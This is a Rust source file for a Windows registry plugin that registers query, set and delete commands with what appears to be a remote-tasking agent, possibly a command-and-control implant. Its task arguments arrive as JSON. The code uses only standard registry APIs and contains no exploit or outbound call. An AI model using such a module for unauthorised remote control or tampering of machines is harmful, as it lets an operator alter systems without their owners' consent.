// registry plugin — Windows registry operations (query/set/delete).
// Enabled via the "registry" feature.
//
// Args JSON:
//   query:  { "action":"query", "path":"HKLM\\SOFTWARE\\...", "name":"..." }
//   set:    { "action":"set", "path":"...", "name":"...", "value":"...", "type":"string|dword" }
//   delete: { "action":"delete", "path":"...", "name":"..." }

use crate::protocol::types::Task;
use crate::registry::{AgentCtx, Registry, TaskResult};

// Custom registry command IDs (agent-side).
pub const CMD_REG_QUERY: u32 = 62;
pub const CMD_REG_SET: u32 = 63;
pub const CMD_REG_DELETE: u32 = 64;

pub fn register(r: &mut Registry) -> Result<(), String> {
    r.register(CMD_REG_QUERY, exec_reg_query)?;
    r.register(CMD_REG_SET, exec_reg_set)?;
    r.register(CMD_REG_DELETE, exec_reg_delete)?;
    Ok(())
}

fn exec_reg_query(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    #[cfg(target_os = "windows")]
    {
        let v: serde_json::Value = serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
        let path = v["path"].as_str().unwrap_or("").to_string();
        let name = v["name"].as_str().unwrap_or("").to_string();
        match reg_query(&path, &name) {
            Ok(s) => Some(TaskResult::ok(&task.id, s)),
            Err(e) => Some(TaskResult::fail(&task.id, format!("registry: {e}"))),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        Some(TaskResult::fail(&task.id, "registry is Windows-only".into()))
    }
}

fn exec_reg_set(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    #[cfg(target_os = "windows")]
    {
        let v: serde_json::Value = serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
        let path = v["path"].as_str().unwrap_or("").to_string();
        let name = v["name"].as_str().unwrap_or("").to_string();
        let value = v["value"].as_str().unwrap_or("").to_string();
        let ty = v["type"].as_str().unwrap_or("string").to_string();
        match reg_set(&path, &name, &value, &ty) {
            Ok(_) => Some(TaskResult::ok(&task.id, "registry value set\n".into())),
            Err(e) => Some(TaskResult::fail(&task.id, format!("registry: {e}"))),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        Some(TaskResult::fail(&task.id, "registry is Windows-only".into()))
    }
}

fn exec_reg_delete(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    #[cfg(target_os = "windows")]
    {
        let v: serde_json::Value = serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
        let path = v["path"].as_str().unwrap_or("").to_string();
        let name = v["name"].as_str().unwrap_or("").to_string();
        match reg_delete(&path, &name) {
            Ok(_) => Some(TaskResult::ok(&task.id, "registry value deleted\n".into())),
            Err(e) => Some(TaskResult::fail(&task.id, format!("registry: {e}"))),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        Some(TaskResult::fail(&task.id, "registry is Windows-only".into()))
    }
}

/// Parse a registry path like "HKLM\SOFTWARE\X" into (root hkey, subkey path).
#[cfg(target_os = "windows")]
fn parse_path(path: &str) -> Result<(windows_sys::Win32::System::Registry::HKEY, String), String> {
    use windows_sys::Win32::System::Registry::*;
    let path = path.replace('/', "\\");
    let (root_str, rest) = match path.find('\\') {
        Some(i) => (&path[..i], &path[i + 1..]),
        None => (path.as_str(), ""),
    };
    let root = match root_str.to_uppercase().as_str() {
        "HKLM" | "HKEY_LOCAL_MACHINE" => HKEY_LOCAL_MACHINE,
        "HKCU" | "HKEY_CURRENT_USER" => HKEY_CURRENT_USER,
        "HKCR" | "HKEY_CLASSES_ROOT" => HKEY_CLASSES_ROOT,
        "HKU" | "HKEY_USERS" => HKEY_USERS,
        _ => return Err(format!("unknown root: {root_str}")),
    };
    Ok((root, rest.to_string()))
}

#[cfg(target_os = "windows")]
fn reg_query(path: &str, name: &str) -> Result<String, String> {
    use windows_sys::Win32::System::Registry::*;
    unsafe {
        let (root, sub) = parse_path(path)?;
        let sub_c = std::ffi::CString::new(sub).map_err(|_| "bad path".to_string())?;
        let mut hkey: HKEY = std::mem::zeroed();
        let open = RegOpenKeyExA(root, sub_c.as_ptr() as *const u8, 0, KEY_READ, &mut hkey);
        if open != 0 {
            return Err(format!("RegOpenKeyEx failed ({open:#x})"));
        }
        let name_c = std::ffi::CString::new(name).unwrap_or_default();
        let mut ty: REG_VALUE_TYPE = 0;
        let mut size: u32 = 4096;
        let mut buf = vec![0u8; size as usize];
        let q = RegQueryValueExA(hkey, name_c.as_ptr() as *const u8, std::ptr::null(), &mut ty, buf.as_mut_ptr(), &mut size);
        if q != 0 {
            RegCloseKey(hkey);
            return Err(format!("RegQueryValueEx failed ({q:#x})"));
        }
        buf.truncate(size as usize);
        let val = match ty {
            REG_SZ | REG_EXPAND_SZ => {
                let s = std::ffi::CStr::from_bytes_until_nul(&buf)
                    .map(|c| c.to_string_lossy().into_owned())
                    .unwrap_or_default();
                s
            }
            REG_DWORD => {
                if buf.len() >= 4 {
                    format!("0x{:08x}", u32::from_le_bytes(buf[..4].try_into().unwrap()))
                } else {
                    "(short)".to_string()
                }
            }
            _ => format!("{} bytes", buf.len()),
        };
        RegCloseKey(hkey);
        Ok(format!("{} = {}\n", name, val))
    }
}

#[cfg(target_os = "windows")]
pub fn reg_set(path: &str, name: &str, value: &str, ty: &str) -> Result<(), String> {
    use windows_sys::Win32::System::Registry::*;
    unsafe {
        let (root, sub) = parse_path(path)?;
        let sub_c = std::ffi::CString::new(sub).map_err(|_| "bad path".to_string())?;
        let mut hkey: HKEY = std::mem::zeroed();
        let open = RegCreateKeyExA(root, sub_c.as_ptr() as *const u8, 0, std::ptr::null(), 0, KEY_SET_VALUE, std::ptr::null(), &mut hkey, std::ptr::null_mut());
        if open != 0 {
            return Err(format!("RegCreateKeyEx failed ({open:#x})"));
        }
        let name_c = std::ffi::CString::new(name).unwrap_or_default();
        let res = if ty == "dword" {
            let dw = value.parse::<u32>().map_err(|_| "bad dword".to_string())?;
            RegSetValueExA(hkey, name_c.as_ptr() as *const u8, 0, REG_DWORD, &dw as *const u32 as *const u8, 4)
        } else {
            let val_c = std::ffi::CString::new(value).map_err(|_| "bad value".to_string())?;
            RegSetValueExA(hkey, name_c.as_ptr() as *const u8, 0, REG_SZ, val_c.as_ptr() as *const u8, (value.len() + 1) as u32)
        };
        RegCloseKey(hkey);
        if res != 0 {
            return Err(format!("RegSetValueEx failed ({res:#x})"));
        }
        Ok(())
    }
}

#[cfg(target_os = "windows")]
pub fn reg_delete(path: &str, name: &str) -> Result<(), String> {
    use windows_sys::Win32::System::Registry::*;
    unsafe {
        let (root, sub) = parse_path(path)?;
        let sub_c = std::ffi::CString::new(sub).map_err(|_| "bad path".to_string())?;
        let mut hkey: HKEY = std::mem::zeroed();
        let open = RegOpenKeyExA(root, sub_c.as_ptr() as *const u8, 0, KEY_SET_VALUE, &mut hkey);
        if open != 0 {
            return Err(format!("RegOpenKeyEx failed ({open:#x})"));
        }
        let name_c = std::ffi::CString::new(name).unwrap_or_default();
        let res = RegDeleteValueA(hkey, name_c.as_ptr() as *const u8);
        RegCloseKey(hkey);
        if res != 0 {
            return Err(format!("RegDeleteValue failed ({res:#x})"));
        }
        Ok(())
    }
}
